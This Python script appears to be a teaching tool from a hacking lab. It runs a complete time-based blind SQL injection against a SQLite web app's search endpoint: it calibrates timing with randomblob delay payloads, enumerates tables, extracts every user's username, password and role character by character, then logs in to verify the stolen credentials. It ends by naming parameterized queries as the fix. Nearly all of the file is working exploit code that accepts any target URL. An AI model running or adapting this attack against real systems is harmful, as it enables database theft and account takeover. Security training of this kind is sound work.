#!/usr/bin/env python3
"""
SQL Injection -- Time-based Blind Attack
=========================================

this is the third and hardest type of SQL injection in the hacklab
it works when the attacker cant see ANY database output at all --
not even a result count or a different page layout

the only signal available is HOW LONG the server takes to respond
we force the database to do heavy computation when our condition is TRUE
and return instantly when it is FALSE, then measure the difference

the trick for sqlite (which has no SLEEP function):
  CASE WHEN (condition) THEN length(randomblob(50000000)) ELSE 0 END

when the condition is TRUE, sqlite allocates 50MB of random data in memory
and computes its length -- this takes 200-500ms depending on the machine
when FALSE, it returns 0 instantly

so if we ask "is the first char of admin's password 'a'?" and the response
takes 300ms instead of the usual 20ms, we know the answer is YES

this is painfully slow compared to classic and blind SQLi because each
character test involves a measurable delay, but it works even when
every other information channel is blocked

targets the same /search endpoint -- same fix (parameterized queries)

usage:
    python3 scripts/sqli_time.py
    python3 scripts/sqli_time.py --target http://127.0.0.1:5000
    python3 scripts/sqli_time.py --delay-size 80000000   (increase if too fast)
"""

import argparse
import re
import sys
import time
import string

try:
    import requests
except ImportError:
    print("Run: pip install requests")
    sys.exit(1)


# ──────────────────────────────────────────────
# config
# ──────────────────────────────────────────────

DEFAULT_TARGET = "http://127.0.0.1:5000"
ATTACKER_USER = "timer_" + str(int(time.time()))[-6:]
ATTACKER_PASS = "timer_probe_2026"

# same charset as blind -- lowercase first because its more common
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "!@#$%^&*_-."

# randomblob size in bytes -- this is the "delay generator"
# too small: the delay is lost in network noise and we get false negatives
# too large: the server runs out of memory and crashes
# 50MB is a good balance for most machines, adjust with --delay-size if needed
DEFAULT_BLOB_SIZE = 50_000_000

# we consider a response "delayed" if it takes longer than baseline * this multiplier
# 2.5x gives enough margin to avoid false positives from network jitter
THRESHOLD_MULTIPLIER = 2.5


# ──────────────────────────────────────────────
# terminal colors
# ──────────────────────────────────────────────

class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    CN = "\033[96m"; B = "\033[1m"; D = "\033[2m"
    M = "\033[95m"; X = "\033[0m"

def banner(t):
    print(f"\n{C.B}{'=' * 62}\n  {t}\n{'=' * 62}{C.X}")

def ok(m):   print(f"  {C.G}[+]{C.X} {m}")
def fail(m): print(f"  {C.R}[-]{C.X} {m}")
def info(m): print(f"  {C.CN}[*]{C.X} {m}")
def warn(m): print(f"  {C.Y}[!]{C.X} {m}")

def is_login_page(text):
    return "<title>Login</title>" in text and 'name="username"' in text


def timed_search(session, target, payload):
    """sends a search query and measures how long the response takes
    returns (elapsed_ms, response_object) as a tuple
    the elapsed time is our ONLY signal in time-based injection"""
    start = time.time()
    resp = session.get(f"{target}/search", params={"q": payload}, timeout=30)
    elapsed = (time.time() - start) * 1000  # convert seconds to milliseconds
    return elapsed, resp


def time_test(session, target, condition, blob_size, threshold_ms):
    """injects a condition and determines if it is TRUE based on response time

    the payload uses a CASE WHEN expression:
      when the condition is TRUE  -> length(randomblob(N)) forces a heavy computation
      when the condition is FALSE -> 0 is returned instantly

    we compare the response time against our calibrated threshold
    if it took longer than the threshold, the condition was TRUE

    returns True/False, or None if the session expired"""
    payload = f"' AND CASE WHEN ({condition}) THEN length(randomblob({blob_size})) ELSE 0 END --"
    elapsed, resp = timed_search(session, target, payload)
    
    # if we got redirected to login, our session is gone
    if is_login_page(resp.text):
        return None
    
    # the only signal: was the response slow or fast?
    return elapsed > threshold_ms


# ──────────────────────────────────────────────
# phase 0 -- authenticate (same as other scripts)
# ──────────────────────────────────────────────

def phase0_auth(session, target):
    banner("PHASE 0 -- Authenticate")
    info(f"Creating throwaway account: '{ATTACKER_USER}'")

    try:
        resp = session.post(f"{target}/register", data={
            "username": ATTACKER_USER,
            "password": ATTACKER_PASS,
            "confirm": ATTACKER_PASS,
        }, allow_redirects=True, timeout=5)

        if is_login_page(resp.text):
            resp = session.post(f"{target}/login", data={
                "username": ATTACKER_USER,
                "password": ATTACKER_PASS,
            }, allow_redirects=True, timeout=5)
            if is_login_page(resp.text):
                fail("Authentication failed")
                return False

        ok(f"Authenticated as '{ATTACKER_USER}'")
        return True
    except requests.exceptions.ConnectionError:
        fail(f"Cannot connect to {target}")
        return False


# ──────────────────────────────────────────────
# phase 1 -- calibrate timing
#
# before we can use timing as a signal, we need to know what "normal" looks like
# we measure three things:
#   1. baseline: how long a normal search takes (no injection)
#   2. delayed: how long a TRUE condition + randomblob takes
#   3. fast: how long a FALSE condition + randomblob takes (should be like baseline)
#
# from these measurements we calculate a threshold:
#   if response > threshold -> TRUE
#   if response < threshold -> FALSE
#
# this calibration step is critical because network latency, server load,
# and machine speed all affect timing -- we cant use hardcoded thresholds
# ──────────────────────────────────────────────

def phase1_calibrate(session, target, blob_size):
    banner("PHASE 1 -- Calibrate Timing")
    info("Measuring baseline response time vs delayed response...\n")

    # measure baseline: 3 normal searches, take the average
    baselines = []
    for _ in range(3):
        elapsed, _ = timed_search(session, target, "test")
        baselines.append(elapsed)
    
    baseline_avg = sum(baselines) / len(baselines)
    info(f"  Baseline (no delay): {C.D}{baseline_avg:.0f}ms avg{C.X}")

    # measure delayed: 3 searches with TRUE condition + randomblob
    # this tells us how much delay the blob actually creates on this machine
    delays = []
    for _ in range(3):
        payload = f"' AND CASE WHEN (1=1) THEN length(randomblob({blob_size})) ELSE 0 END --"
        elapsed, resp = timed_search(session, target, payload)
        if is_login_page(resp.text):
            fail("Session expired during calibration")
            return None
        delays.append(elapsed)

    delay_avg = sum(delays) / len(delays)
    info(f"  Delayed  (TRUE+blob): {C.Y}{delay_avg:.0f}ms avg{C.X}")

    # measure fast: FALSE condition should skip the blob entirely
    # this should be close to baseline -- if it's not, something is wrong
    fast_times = []
    for _ in range(3):
        payload = f"' AND CASE WHEN (1=2) THEN length(randomblob({blob_size})) ELSE 0 END --"
        elapsed, _ = timed_search(session, target, payload)
        fast_times.append(elapsed)

    fast_avg = sum(fast_times) / len(fast_times)
    info(f"  No delay (FALSE+blob): {C.D}{fast_avg:.0f}ms avg{C.X}")

    # check if the delay is actually measurable
    ratio = delay_avg / baseline_avg if baseline_avg > 0 else 0
    info(f"  Delay ratio: {C.Y}{ratio:.1f}x{C.X} slower")

    if ratio < 1.5:
        # the blob isn't causing enough delay to reliably distinguish TRUE from FALSE
        # the user should increase --delay-size to make the computation heavier
        warn(f"Delay ratio too low ({ratio:.1f}x). Try --delay-size {blob_size * 2}")
        warn("Continuing anyway, but results may be unreliable.\n")

    # calculate the decision threshold
    # we want it between the fast average and the delayed average
    # baseline * 2.5 is usually good, but we also enforce a minimum
    threshold = baseline_avg * THRESHOLD_MULTIPLIER
    threshold = max(threshold, (delay_avg + fast_avg) / 2)

    ok(f"Threshold set to {C.Y}{threshold:.0f}ms{C.X}")
    ok(f"  > {threshold:.0f}ms = TRUE (delayed)")
    ok(f"  < {threshold:.0f}ms = FALSE (fast)")

    return threshold


# ──────────────────────────────────────────────
# character extraction engine (time-based version)
#
# same logic as blind extraction but using response time instead of result count
# for each position we test every character and measure how long it takes
# if the response is slow (above threshold), we found the right character
# ──────────────────────────────────────────────

def extract_string_timed(session, target, sql_expr, blob_size, threshold,
                         max_len=50, label=""):
    """extract a string from the database one character at a time using timing"""
    result = ""

    for pos in range(1, max_len + 1):
        found = False

        for ch in CHARSET:
            # escape single quotes in the character to avoid breaking the SQL syntax
            ch_escaped = ch.replace("'", "''")
            condition = f"SUBSTR(({sql_expr}),{pos},1)='{ch_escaped}'"
            is_true = time_test(session, target, condition, blob_size, threshold)

            if is_true is None:
                warn("Session lost -- re-authentication needed")
                return result

            if is_true:
                result += ch
                found = True
                # live progress display
                sys.stdout.write(f"\r  {C.CN}[*]{C.X} {label}: {C.Y}{result}{C.X}{C.D}_{C.X}  ")
                sys.stdout.flush()
                break

        if not found:
            # no character caused a delay at this position -- string is done
            break

    sys.stdout.write(f"\r  {C.G}[+]{C.X} {label}: {C.Y}{result}{C.X}    \n")
    sys.stdout.flush()
    return result


def extract_count_timed(session, target, sql_count_expr, blob_size, threshold):
    """extract a COUNT(*) value by testing each possible number
    we ask "is the count equal to 0?", "equal to 1?", etc until we get TRUE"""
    for n in range(0, 50):
        condition = f"({sql_count_expr})={n}"
        if time_test(session, target, condition, blob_size, threshold):
            return n
    return 0


# ──────────────────────────────────────────────
# phase 2 -- enumerate tables
# ──────────────────────────────────────────────

def phase2_tables(session, target, blob_size, threshold):
    banner("PHASE 2 -- Enumerate Tables (Time-based)")
    info("Extracting table names by measuring response delay...\n")

    # first find how many tables exist
    count = extract_count_timed(
        session, target,
        "SELECT COUNT(*) FROM sqlite_master WHERE type='table'",
        blob_size, threshold
    )
    ok(f"Database has {C.Y}{count}{C.X} table(s)\n")

    # then extract each table name character by character
    tables = []
    for i in range(count):
        sql = f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}"
        name = extract_string_timed(session, target, sql, blob_size, threshold,
                                     label=f"Table {i+1}")
        if name:
            tables.append(name)

    print()
    ok(f"Tables: {C.Y}{', '.join(tables)}{C.X}")
    return tables


# ──────────────────────────────────────────────
# phase 3 -- dump credentials (the slowest phase)
# each character of each field requires a timed HTTP request
# for 3 users with ~8 char passwords, that is roughly 3*8*73 = ~1750 requests
# at 300ms each, this takes about 9 minutes
# ──────────────────────────────────────────────

def phase3_dump(session, target, blob_size, threshold):
    banner("PHASE 3 -- Extract Credentials (Time-based)")

    user_count = extract_count_timed(
        session, target,
        "SELECT COUNT(*) FROM users",
        blob_size, threshold
    )
    ok(f"Found {C.Y}{user_count}{C.X} user(s)\n")
    info("Extracting credentials -- each character requires a timed request.")
    info(f"This is the slowest attack type.\n")

    credentials = []

    for i in range(user_count):
        sql_user = f"SELECT username FROM users LIMIT 1 OFFSET {i}"
        username = extract_string_timed(session, target, sql_user,
                                         blob_size, threshold, label=f"User {i+1} name")

        sql_pass = f"SELECT password FROM users WHERE username='{username}'"
        password = extract_string_timed(session, target, sql_pass,
                                         blob_size, threshold, label=f"User {i+1} pass")

        sql_role = f"SELECT role FROM users WHERE username='{username}'"
        role = extract_string_timed(session, target, sql_role,
                                     blob_size, threshold, max_len=10, label=f"User {i+1} role")

        credentials.append((username, password, role))
        print()

    if credentials:
        print(f"\n  {C.B}{'USERNAME':<20}{'PASSWORD':<25}{'ROLE':<10}{C.X}")
        print(f"  {'─' * 55}")
        for username, password, role in credentials:
            role_color = C.R if role == 'admin' else C.D
            print(f"  {C.Y}{username:<20}{C.X}{C.R}{password:<25}{C.X}{role_color}{role:<10}{C.X}")

    return credentials


# ──────────────────────────────────────────────
# phase 4 -- verify
# ──────────────────────────────────────────────

def phase4_verify(target, credentials):
    banner("PHASE 4 -- Verify Stolen Credentials")

    verified = 0
    for username, password, role in credentials:
        s = requests.Session()
        resp = s.post(f"{target}/login", data={
            "username": username, "password": password,
        }, allow_redirects=False, timeout=5)

        if resp.status_code == 302:
            ok(f"{C.G}VERIFIED{C.X}  {C.Y}{username}{C.X}:{C.R}{password}{C.X}")
            verified += 1
            try: s.get(f"{target}/logout", timeout=3)
            except: pass
        else:
            fail(f"FAILED   {username}:{password}")

    print(f"\n  {verified}/{len(credentials)} credentials verified")


# ──────────────────────────────────────────────
# summary
# ──────────────────────────────────────────────

def print_summary(total_requests, elapsed, cred_count, threshold):
    banner("ATTACK SUMMARY -- Time-based Blind SQL Injection")
    print(f"""
  {C.B}How the three types compare:{C.X}

    Classic:     1 UNION request -> all data at once
    Blind:       ~{cred_count * 200} requests -> observes result count per character
    Time-based:  ~{total_requests} requests -> observes response TIME per character

  {C.B}Statistics:{C.X}
    Total HTTP requests:  {total_requests}
    Time elapsed:         {elapsed:.1f} seconds
    Credentials found:    {cred_count}
    Timing threshold:     {threshold:.0f}ms

  {C.Y}When time-based is the only option:{C.X}
    - App returns the same page regardless of query results
    - Error messages are suppressed
    - Result count is not visible
    - The ONLY observable difference is how long the response takes

  {C.Y}SQLite delay technique:{C.X}
    CASE WHEN (condition) THEN length(randomblob(50000000)) ELSE 0 END
    SQLite has no SLEEP() -- we force it to generate 50MB of random data.
    Other databases: MySQL has SLEEP(), PostgreSQL has pg_sleep().

  {C.Y}Fix:{C.X}
    Parameterized queries prevent ALL three types:
    db.session.execute(text("... WHERE title LIKE :q"), {{"q": f"%{{q}}%"}})
""")


# ──────────────────────────────────────────────
# main
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SQL Injection -- Time-based Blind")
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--delay-size", type=int, default=DEFAULT_BLOB_SIZE,
                        help="randomblob size in bytes (increase if delay too short)")
    args = parser.parse_args()
    target = args.target.rstrip("/")
    blob_size = args.delay_size

    print(f"""
{C.B}{C.R}
  ████████╗██╗███╗   ███╗███████╗
  ╚══██╔══╝██║████╗ ████║██╔════╝
     ██║   ██║██╔████╔██║█████╗  
     ██║   ██║██║╚██╔╝██║██╔══╝  
     ██║   ██║██║ ╚═╝ ██║███████╗
     ╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝
{C.X}
  {C.D}Time-based Blind SQL Injection{C.X}
  {C.D}Target: {target}{C.X}
  {C.D}Blob size: {blob_size:,} bytes{C.X}
""")

    session = requests.Session()
    start_time = time.time()

    # count every HTTP request so we can report the total at the end
    request_counter = [0]

    original_get = session.get
    def counting_get(*a, **kw):
        request_counter[0] += 1
        return original_get(*a, **kw)
    session.get = counting_get

    original_post = session.post
    def counting_post(*a, **kw):
        request_counter[0] += 1
        return original_post(*a, **kw)
    session.post = counting_post

    if not phase0_auth(session, target):
        sys.exit(1)

    threshold = phase1_calibrate(session, target, blob_size)
    if threshold is None:
        sys.exit(1)

    tables = phase2_tables(session, target, blob_size, threshold)

    credentials = phase3_dump(session, target, blob_size, threshold)
    if not credentials:
        fail("Could not extract credentials")
        sys.exit(1)

    phase4_verify(target, credentials)

    elapsed = time.time() - start_time
    print_summary(request_counter[0], elapsed, len(credentials), threshold)


if __name__ == "__main__":
    main()
